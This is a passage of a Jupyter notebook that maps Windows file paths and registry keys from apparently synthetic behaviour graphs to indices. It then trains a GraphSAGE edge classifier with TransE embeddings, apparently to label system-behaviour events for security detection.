       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sr\\\\*': 911,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser\\\\newtab\\\\.git': 912,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Packages\\\\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\\\\Settings': 913,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0': 914,\n",
       " 'C:\\\\Users\\\\ezk\\\\Searches\\\\*': 915,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 916,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\my\\\\*': 917,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\\\\AC\\\\.git': 918,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00_8wekyb3d8bbwe\\\\AC\\\\*': 919,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\RoamingState': 920,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\\\.git': 921,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-AR\\\\*': 922,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache\\\\*': 923,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\th\\\\*': 924,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ar\\\\*': 925,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\.git': 926,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.045.0227.0004\\\\.git': 927,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\mcg': 928,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Microsoft\\\\PenWorkspace\\\\*': 929,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 930,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalState': 931,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\tr\\\\.git': 932,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\wasm\\\\index-dir\\\\*': 933,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Snapshots\\\\94.0.4606.81': 934,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\3D Objects': 935,\n",
       " 'C:\\\\Users\\\\inguyen\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\Temp\\\\.git': 936,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 937,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings': 938,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 939,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\qmlcache\\\\.git': 940,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 941,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 942,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 943,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 944,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Printer Shortcuts\\\\.git': 945,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 946,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\.git': 947,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\AppCache\\\\*': 948,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-US': 949,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsMaps_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 950,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\tr': 951,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Layouts': 952,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AppData\\\\*': 953,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 954,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 955,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 956,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\GameExplorer': 957,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\ESE\\\\*': 958,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData': 959,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\LocalState\\\\.git': 960,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\it': 961,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState\\\\*': 962,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\.git': 963,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_tw.yahoo.com_0.indexeddb.leveldb': 964,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\1451318868ntouromlalnodry--epcr.files\\\\*': 965,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 966,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Speech Recognition\\\\1.15.0.1': 967,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\gd\\\\.git': 968,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sk\\\\*': 969,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\INetCache': 970,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\cy-GB': 971,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\SystemAppData': 972,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\LocalCache\\\\*': 973,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Latn-ME\\\\.git': 974,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\LocalCache\\\\*': 975,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Mozilla': 976,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\fil\\\\*': 977,\n",
       " 'mEjFqNoZj': 978,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\*': 979,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\Temp': 980,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\.git': 981,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\tr\\\\.git': 982,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\LocalState\\\\.git': 983,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\el': 984,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy\\\\LocalState\\\\*': 985,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AppData': 986,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\ca': 987,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\TempState': 988,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\qmlcache\\\\.git': 989,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 990,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox': 991,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AC\\\\Temp': 992,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-JM': 993,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AppData': 994,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 995,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\LocalState\\\\*': 996,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group1\\\\*': 997,\n",
       " 'HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\VIDEO\\\\\\\\Device\\\\Video5': 998,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.1_8wekyb3d8bbwe\\\\AC\\\\INetCache': 999,\n",
       " ...}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "node_ent2idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "5cd25846-a18b-4908-994c-d662bb5b7d81",
   "metadata": {},
   "outputs": [],
   "source": [
    "# with open(f'./secureBERT_YR/node_vocab2index.pkl', 'rb') as fp:\n",
    "#     node_ent2idx_YR = pickle.load(fp)\n",
    "# with open(f'./secureBERT_YR/edge_vocab2index.pkl', 'rb') as fp:\n",
    "#     edge_ent2idx_YR = pickle.load(fp)\n",
    "    \n",
    "# with open(f'./secureBERT_YR/nodes_ent2emb_256.pkl', 'rb') as fp:\n",
    "#     node_ent2emb_YR = pickle.load(fp)\n",
    "# with open(f'./secureBERT_YR/edges_ent2emb_16.pkl', 'rb') as fp:\n",
    "#     edge_ent2emb_YR = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2956d24d-179a-44ce-afa9-17f0b8d35a17",
   "metadata": {},
   "source": [
    "### Add the embedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "43c8e260-e849-4c88-bf0c-394ab2951117",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e33dead80c4c481399cd44870cb6de35",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "0it [00:00, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b4ddd252a9054e26adf3fc3a3822c46a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "0it [00:00, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "DIM = 50\n",
    "embedding = \"transE\"\n",
    "embedding = f'{embedding}_{DIM}'\n",
    "\n",
    "# with open(f\"../data/4_embedding/{embedding}.vec.json\", \"r\") as f:\n",
    "with open(f\"../data/4_embedding_3/{embedding}.vec.json\", \"r\") as f:\n",
    "    tmp = json.load(f)\n",
    "\n",
    "node_ent2emb = {idx:emb for idx, emb in tqdm(enumerate(tmp[\"ent_embeddings.weight\"]))}\n",
    "edge_ent2emb = {idx:emb for idx, emb in tqdm(enumerate(tmp[\"rel_embeddings.weight\"]))}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "385dc97f-7cd0-4c28-951b-b46f85752fd1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "50"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2emb[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "5680deba-a6b4-4ed3-9819-b8ec496ff6cd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "50"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(edge_ent2emb[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "a65757d8-2ced-4f02-9d09-33f796baad7a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # 将 node_ent2emb, edge_ent2emb 转换为 NumPy 数组\n",
    "# node_ent2emb = np.array([node_ent2emb[i] for i in range(len(node_ent2emb))], dtype=np.float32)\n",
    "# edge_ent2emb = np.array([edge_ent2emb[i] for i in range(len(edge_ent2emb))], dtype=np.float32)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "42ffa5fc-3808-4463-8cab-984b0eb98560",
   "metadata": {},
   "outputs": [],
   "source": [
    "# node_ent2emb.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7f26c941-9feb-461d-a32e-0db2bae274df",
   "metadata": {},
   "outputs": [],
   "source": [
    "# edge_ent2emb.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "8fb57cc1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a04fefc40204a569aa30826bf3e1659",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/167 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b66c8600b3c24dacbb2dd057e9f1edc3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/13360 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd274bef1bf64c118fd1a41bc5fc4d75",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/1670 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "65b3fe4fb8d94779915993099332817b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/1670 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "type2attr = {\n",
    "    \"Process\": \"Cmdline\", \n",
    "    \"File\": \"Name\", \n",
    "    \"Registry\": \"Key\", \n",
    "    \"Network\": \"Dstaddress\"\n",
    "}\n",
    "\n",
    "random.seed(42)\n",
    "trainset, validset, testset = [], [], []\n",
    "for ability in tqdm(os.listdir('../data/Raw_dataset/')):\n",
    "    paths = glob(f'../data/Raw_dataset/{ability}/number_*/expanded_instance.json')\n",
    "    # paths = glob(f'../data/Raw_dataset/{ability}/number_*/expanded_instance.json')\n",
    "    random.shuffle(paths)\n",
    "    trainset.extend(paths[:80])\n",
    "    validset.extend(paths[80:90])\n",
    "    testset.extend(paths[90:])\n",
    "    # break\n",
    "    \n",
    "train_data = make_dataset(trainset)\n",
    "valid_data = make_dataset(validset)\n",
    "test_data = make_dataset(testset)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "099b2b2d",
   "metadata": {},
   "source": [
    "# Make Torch dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "7de9ad0e",
   "metadata": {},
   "outputs": [],
   "source": [
    "class GraphDataset(Dataset):\n",
    "    def __init__(self, data_list, device):\n",
    "        self.data_list = data_list\n",
    "        self.device = device\n",
    "\n",
    "    def __len__(self):\n",
    "        return len(self.data_list)\n",
    "    \n",
    "    def __getitem__(self, idx):\n",
    "        data = self.data_list[idx]\n",
    "        return data\n",
    "\n",
    "def collate(samples):\n",
    "    data_list = samples\n",
    "    batched_graphs = []\n",
    "    for data in data_list:\n",
    "        g = dgl.graph((data[\"edge_index\"][0], data[\"edge_index\"][1]), num_nodes=data[\"num_nodes\"])\n",
    "\n",
    "        g.ndata['feat'] = torch.stack(data[\"node_feat\"])\n",
    "        g.edata['feat'] = torch.stack(data[\"edge_attr\"])\n",
    "        # print(data[\"labels\"])\n",
    "        g.edata['label'] = torch.tensor(data[\"labels\"])  \n",
    "\n",
    "        batched_graphs.append(g)\n",
    "    \n",
    "    return dgl.batch(batched_graphs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "f48e4e86",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_GraphDataset = GraphDataset(train_data, device)\n",
    "valid_GraphDataset = GraphDataset(valid_data, device)\n",
    "test_GraphDataset = GraphDataset(test_data, device)\n",
    "\n",
    "batch_size = 32\n",
    "\n",
    "train_dataloader = DataLoader(train_GraphDataset, batch_size, shuffle=True, collate_fn=collate)\n",
    "valid_dataloader = DataLoader(valid_GraphDataset, batch_size, shuffle=True, collate_fn=collate)\n",
    "test_dataloader = DataLoader(test_GraphDataset, batch_size, shuffle=False, collate_fn=collate)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8ff8c620",
   "metadata": {},
   "source": [
    "# Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "35625234",
   "metadata": {},
   "outputs": [],
   "source": [
    "class GraphSAGE(nn.Module):\n",
    "    def __init__(self, in_dim, hidden_dim, out_dim):\n",
    "        super(GraphSAGE, self).__init__()\n",
    "        self.layer1 = dglnn.SAGEConv(in_dim, hidden_dim, 'pool')\n",
    "        self.layer2 = dglnn.SAGEConv(hidden_dim, out_dim, 'pool')\n",
    "        self.dropout = nn.Dropout(0.25)\n",
    "\n",
    "    def forward(self, g, inputs):\n",
    "        h = self.layer1(g, inputs)\n",
    "        h = torch.relu(h)\n",
    "        h = self.dropout(h)\n",
    "        h = self.layer2(g, h)\n",
    "        return h\n",
    "    \n",
    "class MLPPredictor(nn.Module):\n",
    "    def __init__(self, out_feats, out_classes, edge_embedding_dim):\n",
    "        super().__init__()\n",
    "        self.W = nn.Linear(out_feats*2 + edge_embedding_dim, out_classes)\n",
    "\n",
    "    def apply_edges(self, edges, edge_feat):\n",
    "        h_u = edges.src['h']\n",
    "        h_v = edges.dst['h']\n",
    "        h_e = edge_feat\n",
    "        score = self.W(torch.cat([h_u, h_v, h_e], 1))\n",
    "        return {'score': score}\n",
    "\n",
    "    def forward(self, graph, h, edge_feat):\n",
    "        with graph.local_scope():\n",
    "            graph.ndata['h'] = h\n",
    "            # graph.apply_edges(self.apply_edges)\n",
    "            graph.apply_edges(lambda edges: self.apply_edges(edges, edge_feat))\n",
    "            return graph.edata['score']\n",
    "        \n",
    "class Model(nn.Module):\n",
    "    def __init__(self, in_features, hidden_features, out_features, num_classes, edge_embedding_dim):\n",
    "        super().__init__()\n",
    "        self.sage = GraphSAGE(in_features, hidden_features, out_features)\n",
    "        self.pred = MLPPredictor(out_features, num_classes, edge_embedding_dim)\n",
    "      \n",
    "    def forward(self, g, node_feat, edge_feat, return_logits=False):\n",
    "        h = self.sage(g, node_feat)\n",
    "        logits = self.pred(g, h, edge_feat)\n",
    "        \n",
    "        return logits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "a2f246b0",
   "metadata": {},
   "outputs": [],
   "source": [
    "def same_seeds(seed = 42):\n",
    "    torch.manual_seed(seed)\n",
    "    if torch.cuda.is_available():\n",
    "        torch.cuda.manual_seed(seed)\n",
    "        torch.cuda.manual_seed_all(seed)  \n",
    "    np.random.seed(seed)  \n",
    "    torch.backends.cudnn.benchmark = False\n",
    "    torch.backends.cudnn.deterministic = True\n",
    "\n",
    "def model_fn(batched_g, model, criterion, device, which_type='train'):\n",
    "    \"\"\"Forward a batch through the model.\"\"\"\n",
    "    batched_g = batched_g.to(device)\n",
    "    \n",
    "    labels = batched_g.edata['label'].to(device)    \n",
    "    # logits = model(batched_g, batched_g.ndata['feat'].float())\n",
    "    logits = model(batched_g, batched_g.ndata['feat'].float(), batched_g.edata['feat'].float())\n",
    "    loss = criterion(logits, labels)\n",
    "\n",
    "    output = torch.softmax(logits, dim=1)\n",
    "    preds = output.argmax(1)\n",
    "    # print(preds)\n",
    "    \n",
    "    accuracy = torch.mean((preds == labels).float())\n",
    "        \n",
    "    return loss, accuracy, preds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "c3032d04-6f91-46f7-840b-3677018f8353",
   "metadata": {},
   "outputs": [],
   "source": [
    "# for data in tqdm(train_dataloader):\n",
    "#     print(data)\n",
    "#     print()\n",
    "#     print(data.edata['label'])\n",
    "#     break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "e40b877f-1754-49ec-8e0c-55a3a557c4bf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "274"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(label2index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "6b71dff3-e7c7-475e-bc7f-8e11d654cb38",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.environ['CUDA_VISIBLE_DEVICES'] = \"0\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "b71e5a05-4b50-4227-9773-90b739931ae8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cuda\n"
     ]
    }
   ],
   "source": [
    "print(device)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "8b661d51-8566-4a3f-9304-ac5ed6514aea",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For release the GPU memory\n",
    "# No need to restart the kernel\n",
    "\n",
    "import gc\n",
    "gc.collect()\n",
    "torch.cuda.empty_cache()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "c71261a2",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5a3929c884c349cea062985a9c281086",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/200 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a2cb473817334041844ae4a133f2f130",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
